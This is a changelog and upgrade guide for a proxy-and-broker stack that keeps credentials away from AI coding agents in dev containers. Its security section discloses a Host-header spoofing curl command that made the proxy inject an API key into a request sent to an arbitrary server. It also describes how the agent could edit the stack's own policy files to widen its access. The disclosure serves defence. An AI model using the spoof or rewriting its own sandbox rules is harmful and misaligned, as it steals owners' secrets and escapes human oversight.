# Changelog

Notable changes per release, and what you have to do to move between them.

The format is loosely [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This project versions the **security boundary**, not the code: a major bump
means the guarantees changed or an upgrade needs manual steps to stay safe.

---

## 1.0.0 — unreleased

### Security

**Fixed: a spoofed `Host` header made the proxy send credentials to any server
of the caller's choosing.** Every addon matched `flow.request.pretty_host`,
which prefers the client-supplied `Host` header, while mitmproxy actually
connects to `flow.request.host` (absolute-form URI, CONNECT authority, or TLS
SNI). From inside the dev container:

```bash
curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/v1/messages
```

The addon believed the request was bound for Anthropic, fetched the real API
key from the broker, and injected it into a request delivered to `my-server`.
The same trick worked against `000_policy.py`, so `-H 'Host: anything'` reached
`broker:8080/github/token` — the proxy is the only component bridging the `dev`
and `secure` networks, so network isolation does not cover that path. It also
defeated `001_allowlist.py` egress control outright.

Three credential types were exposed: the Anthropic API key or auth token,
GitHub App installation tokens, and scoped Cloudflare tokens. Nothing in the
logs looks unusual — the proxy records an ordinary `server connect`.

All addons now match `flow.request.host`. `000_policy.py` additionally checks
the claimed host, so a request merely *labelled* internal is refused too.

> **Rotate your credentials as part of this upgrade.** Treat any secret that
> was reachable through a 0.1.0 proxy as disclosed unless you are certain no
> untrusted code ran in the dev container. Absence of evidence is not evidence
> here — a successful exfiltration leaves no distinctive trace.

**Fixed: the dev container could rewrite the stack's own configuration**
(`examples/dev-container`). That example mounts `../` — the parent of
`.devcontainer` — read-write at `/workspace`, so the agent could edit
`addons/`, `providers/`, `gateway.d/` and `compose.yaml`: neuter the policy
addon, add a prefix-match location exposing `/github/token`, or point a
provider at a host it controls. It could not restart the containers itself, but
the edit persisted and took effect the next time a human did. A nested
read-only bind now shadows `.devcontainer` while the project stays writable.

**Fixed: an inline comment in the proxy allowlist disabled the domain it was
written on.** `api.example.com  # read only` parsed `# read only` as the method
list, so every method was blocked. Fail-closed, but silent — the domain simply
stopped working. Comments are now stripped before parsing.

### Changed

**`cred-gateway` ships no provider endpoints.** The base image previously baked
in `/github/credential` and `/github/identity`. It now serves `/healthz`,
`include /etc/nginx/gateway.d/*.conf`, then `location / { return 403; }` — so
out of the box it denies everything. Endpoints come from a bind-mounted
directory of snippets, the same convention the broker already used for
`/app/providers` and the proxy for `/addons`: the base image is mechanism, the
deployment supplies content. This is what lets you add endpoints for your own
providers without forking the image.

**`examples/claude-code` runs the dev container as `agent`, not `root`.** The
`ubuntu` user is renamed to `agent`, `HOME` becomes `/home/agent`, and Claude
Code installs under that user. The persisted-state mounts move to match
(`/root/.claude` → `/home/agent/.claude`, and likewise `.claude.json` and
`.config`) — `tests/integration/00-config-lint` now checks those targets
against the image's `HOME`, since a mismatch loses settings silently rather
than failing.

**`CLAUDE_VERSION` build arg** in the same example pins or refreshes the Claude
Code install without busting the apt/node/bun layers.

**Both examples are laid out one directory per service**, mirroring `stack/`:

```
addons/      →  proxy/addons/
providers/   →  broker/providers/
gateway.d/   →  cred-gateway/gateway.d/
dev/            (unchanged)
```

Contents are untouched — this is purely a move. Previously you had to know that
addons are a mitmproxy concept and providers a broker one to tell which
directory belonged to which service; now the name answers it. The mount lines
also become identical to `stack/compose.yaml`, so the two are diffable.

Nothing breaks for an existing deployment: you own your `compose.yaml` and it
keeps pointing wherever it already points. It matters only when you re-copy
from an example or follow the docs, which now use the new paths.

### Added

- **`tests/`** — two tiers behind a `tests/run.sh` facade.
  `tests/integration/` covers the security boundaries against stubs: no
  credentials, free, ~60s, 144 assertions. `tests/e2e/` covers what a stub
  cannot reach (HTTPS/CONNECT, the CA cert lifecycle, `git push` through the
  credential helper) using a dedicated GitHub App, and skips cleanly when it is
  not configured. A bare `tests/run.sh` never runs e2e.
- **`stack/cred-gateway/gateway.d/README.md`** and
  **`stack/broker/providers/README.md`** — authoring rules for the two content
  seams, and an explicit statement that both directories are empty by design.
- Reference `gateway.d/github.conf` vendored into both examples.
- `stack/compose.yaml` now says up front that it is a reference skeleton with
  empty provider and gateway mounts, so it will not serve credentials as-is.
  It never did; it just did not say so.

---

## Upgrading from 0.1.0

Roughly 20 minutes, most of it waiting on rebuilds. Steps 1–3 are required for
anyone; 4 and 5 depend on which example you run.

### 0. Rotate credentials

See the security note above. Do this first — the rest of the upgrade is
pointless if a disclosed key is still live.

- Anthropic: issue a new API key or auth token, revoke the old one.
- GitHub: generate a new App private key, delete the old one. Installation
  tokens expire on their own within an hour.
- Cloudflare: roll the minter token.

### 1. Update your vendored addons — `docker compose pull` will not do it

This is the step that is easy to miss. The addons are **bind-mounted from your
deployment directory**, not baked into the proxy image, so rebuilding or
repulling the image leaves the vulnerable files exactly where they are.

Copy the fixed addons over your own:

```bash
# from a fresh checkout of this repo at v1.0.0.
# Note the source path: examples moved to one directory per service in 1.0.0,
# so addons now live under proxy/. Your own deployment can keep whatever
# layout it already has — only the source of the copy changed.
cp examples/claude-code/proxy/addons/*.py /path/to/your/deployment/addons/
```

If you have written your own addons, the fix is one line each — every host
comparison must use `flow.request.host`:

```python
# WRONG — the caller controls this
if flow.request.pretty_host == "api.example.com":

# RIGHT — this is where mitmproxy actually connects
if flow.request.host == "api.example.com":
```

Verify with the regression suite, which fails against the old code:

```bash
tests/run.sh 20 25 30
```

### 2. Add the `gateway.d` mount, or git stops working

The new `cred-gateway` image denies everything it is not explicitly given. If
you upgrade the image without mounting snippets, `/github/credential` and
`/github/identity` start returning **403**, the git credential helper returns
nothing, and pushes fail with an authentication error that does not mention
nginx anywhere.

Create the directory next to your `compose.yaml` and copy the reference
snippet:

```bash
mkdir -p gateway.d
cp /path/to/repo/examples/claude-code/cred-gateway/gateway.d/github.conf gateway.d/
```

Add the mount to the `cred-gateway` service:

```yaml
  cred-gateway:
    volumes:
      - ./gateway.d:/etc/nginx/gateway.d:ro
```

Two rules when writing your own snippets — both are checked by
`tests/integration/00-config-lint`:

- **Exact matches only.** `location = /github/credential`. A prefix match like
  `location /github/` also exposes `/github/token`, which hands the dev
  container a raw installation token.
- **The host path must be invisible to the dev container.** If your snippets
  live inside whatever is mounted at `/workspace`, the agent can widen its own
  whitelist and wait for a restart.

Full rules in `stack/cred-gateway/gateway.d/README.md`.

### 3. Re-check your allowlist

If you use `001_allowlist.py` and any line carried a trailing comment, that
domain was blocked entirely in 0.1.0 regardless of what you intended. Those
lines now work as written — which means **traffic that was being denied will
start flowing**. Read the file once and confirm each entry is what you actually
want to permit:

```
api.example.com                 # was: blocked. now: GET, HEAD, OPTIONS
upload.example.com PUT,POST     # unchanged
```

### 4. `examples/dev-container` — add the shadow mount

```yaml
  dev:
    volumes:
      - ../:/workspace:cached
      - ../.devcontainer:/workspace/.devcontainer:ro   # add this
      - proxy-certs:/proxy-certs:ro
```

Nested mounts win over their parent, so this makes the stack config read-only
to the agent while the project stays writable. Rebuild the container for it to
take effect. Confirm with:

```bash
tests/run.sh 50
```

### 5. `examples/claude-code` — fix ownership of the persisted state

The dev container no longer runs as root, so the files under `./workspace/`
created by 0.1.0 are owned by a user that no longer writes them:

```bash
docker compose build --no-cache dev
docker compose up -d --force-recreate dev

# `agent` is `ubuntu` renamed, so it keeps uid/gid 1000 from ubuntu:24.04.
# Confirm before chowning — the wrong id is worse than no chown at all.
docker compose exec dev id agent      # expect uid=1000(agent) gid=1000(agent)
sudo chown -R 1000:1000 examples/claude-code/workspace/
```

The mount targets moved with it — `/root/.claude` → `/home/agent/.claude`, and
likewise for `.claude.json` and `.config`. If you are carrying a modified
`compose.yaml`, make the same change: left at `/root/`, the bind mounts land
somewhere Claude Code never reads, and settings and auth state silently vanish
on every recreate.

### 6. Verify the boundary end to end

```bash
tests/run.sh                       # the whole integration tier
```

Then, inside a running dev container:

```bash
/path/to/stack/scripts/smoke-test.sh
```

The checks that matter: the broker must be unreachable both directly and
through the proxy, and `/github/token`, `/anthropic/key` and `/cloudflare/token`
must all return 403 from the gateway.

---

## 0.1.0

Initial release. Broker, mitmproxy-based credential injection, nginx
cred-gateway with baked-in GitHub endpoints, two-network isolation, and the
`dev-container` and `claude-code` examples.
